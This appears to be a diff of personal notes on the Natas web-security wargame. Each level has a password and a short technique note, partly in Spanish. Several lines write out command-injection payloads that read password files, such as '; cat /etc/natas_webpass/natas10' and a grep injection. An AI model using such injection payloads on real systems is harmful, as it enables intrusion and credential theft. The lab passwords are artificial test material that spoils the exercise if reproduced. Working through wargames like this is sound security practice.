@@ -1,13 +1,36 @@
-1: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
-2: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
-3: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
-4: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
-5: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
-6: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
-7: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
-8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
-	echo "==QcCtmMml1ViV3b" | rev
-	b3ViV1lmMmtCcQ==
-9: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
-	ooooo dictionary.txt; cat /etc/natas_webpass/natas10;
-10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+natas11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+
+natas10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+injeccion de comandos manipulando el comando grep
+grep -i .* /etc/natas_webpass/natas11 #
+
+
+natas9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+command injection
+; cat  /etc/natas_webpass/natas10
+
+natas8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+dejaron los pasos de una codificación expuesta 
+
+
+natas7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+Directory Traversal a traves de PHP
+
+natas6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+información sensible expuesta. Información que permite acceder a directorios donde se guardan passwords
+
+natas5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+intercept and change one parameter from 0 to 1
+
+natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+Open Redirect
+
+natas3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+search in robots.txt
+
+natas2: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
+Escalar directorios
+
+natas1: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+View Source - Ctrl + U
